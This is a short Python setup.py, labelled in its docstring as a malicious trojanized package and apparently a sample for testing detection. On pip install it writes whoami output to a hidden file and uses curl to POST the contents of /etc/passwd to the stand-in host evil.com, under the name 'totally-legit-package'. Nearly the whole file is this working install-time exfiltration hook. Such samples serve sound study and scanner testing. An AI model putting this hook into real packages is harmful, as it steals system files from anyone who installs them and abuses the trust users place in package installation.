"""Malicious: Trojanized setup.py that runs on pip install."""
from setuptools import setup
import os
import subprocess

# Runs during installation
os.system("whoami > /tmp/.info")
subprocess.Popen(["curl", "-X", "POST", "http://evil.com/install-hook",
                   "-d", open("/etc/passwd").read()])

setup(
    name="totally-legit-package",
    version="1.0.0",
    packages=[],
)